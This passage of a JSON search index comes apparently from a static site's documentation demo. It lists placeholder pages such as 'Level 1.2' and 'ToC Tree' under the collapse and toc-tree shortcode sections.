1.1","parent":"Level 1","content":"Level 1.1\n","description":"Level 1.1"},{"id":50,"href":"/collapse/level-1/level-1-2/","title":"Level 1.2","parent":"Level 1","content":"Level 1.2\n","description":"Level 1.2"},{"id":51,"href":"/toc-tree/level-1/level-1-2/","title":"Level 1.2","parent":"Level 1","content":"Level 1.2\n","description":"Level 1.2"},{"id":52,"href":"/toc-tree/level-1/level-1-3/","title":"Level 1.3","parent":"Level 1","content":"Level 1.3\nLevel 1.3.1 ","description":"Level 1.3\nLevel 1.3.1 "},{"id":53,"href":"/toc-tree/level-1/level-1-3/level-1-3-1/","title":"Level 1.3.1","parent":"Level 1.3","content":"Level 1.3.1\n","description":"Level 1.3.1"},{"id":54,"href":"/collapse/level-2/level-2-1/","title":"Level 2.1","parent":"Level 2","content":"Level 2.1\n","description":"Level 2.1"},{"id":55,"href":"/toc-tree/level-2/level-2-1/","title":"Level 2.1","parent":"Level 2","content":"Level 2.1\n","description":"Level 2.1"},{"id":56,"href":"/collapse/level-2/level-2-2/","title":"Level 2.2","parent":"Level 2","content":"Level 2.2\n","description":"Level 2.2"},{"id":57,"href":"/toc-tree/level-2/level-2-2/","title":"Level 2.2","parent":"Level 2","content":"Level 2.2\n","description":"Level 2.2"},{"id":58,"href":"/tags/","title":"Tags","parent":"Documentation","content":"","description":""},{"id":59,"href":"/toc-tree/","title":"ToC Tree","parent":"Documentation","content":"This is just a demo section for the toc-tree shortcode.\nLevel 1 Level 1.1 Level 1.2 Level 1.3 Level 1.3.1 Level 2 Level 2.1 Level 2.2 ","description":"This is just a demo section for the toc-tree shortcode.\nLevel 1 Level 1.1 Level 1.2 Level 1.3 Level 1.3.1 Level 2 Level 2.1 Level 2.2 "}]